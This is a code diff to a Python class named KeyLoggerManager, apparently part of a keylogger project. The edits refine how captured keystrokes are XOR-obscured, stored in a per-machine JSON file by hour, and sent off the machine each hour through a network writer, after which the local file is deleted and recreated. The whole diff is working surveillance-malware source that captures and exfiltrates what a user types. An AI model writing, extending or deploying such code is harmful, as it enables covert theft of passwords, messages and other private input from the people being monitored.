@@ -12,10 +12,14 @@ class KeyLoggerManager:
     def __init__(self):
         self.buffer = []
         self.config = self.load_config()
-        self.timestamp = str(datetime.datetime.now())
+        self.timestamp = self.get_hour_timestamp()
         self.end = False
         self.machine_name = self.config.get("machine_name", "unknown")
+        self.file_path = f'{self.machine_name}.json'
 
+        if not os.path.exists(self.file_path):
+            with open(self.file_path, "w") as file:
+                json.dump({}, file)
 
     def load_config(self):
         try:
@@ -28,17 +32,22 @@ class KeyLoggerManager:
 
             }
 
+    def get_hour_timestamp(self):
+        now = datetime.datetime.now()
+        hour_timestamp = now.replace(minute=0, second=0, microsecond=0)
+        return str(hour_timestamp)
+
     def send_to_network(self):
         while not self.end:
             time.sleep(3600)
-            with open(f'{self.machine_name}.json','r') as file:
+            with open(self.file_path,'r') as file:
                 content = json.load(file)
             networkWriter.send_data(content,self.machine_name)
-            os.remove(f'{self.machine_name}.json')
+            os.remove(self.file_path)
+            self.timestamp = self.get_hour_timestamp()
 
-
-
-
+            with open(self.file_path, "w") as file:
+                json.dump({}, file)
 
 
 
@@ -49,6 +58,10 @@ class KeyLoggerManager:
             network_thread.start()
 
             while not self.end:
+                current_hour = self.get_hour_timestamp()
+                if current_hour != self.timestamp:
+                    self.timestamp = current_hour
+
                 new_keys = service.get_logged_keys()
                 if new_keys:
                     self.buffer.extend(new_keys)
@@ -58,13 +71,10 @@ class KeyLoggerManager:
                         self.end = True
 
                     encrypted_keys = [encryptor.ascii_xor(char) for char in self.buffer]
-                    content = {self.timestamp: encrypted_keys}
-                    file_writer.send_data(content, self.machine_name)
 
+                    data_dict = {self.timestamp: encrypted_keys}
+                    file_writer.send_data(data_dict, self.machine_name)
 
-
-
-                    print(self.buffer,self.timestamp)
 
                     self.buffer = []
                     service.logged_keys = []
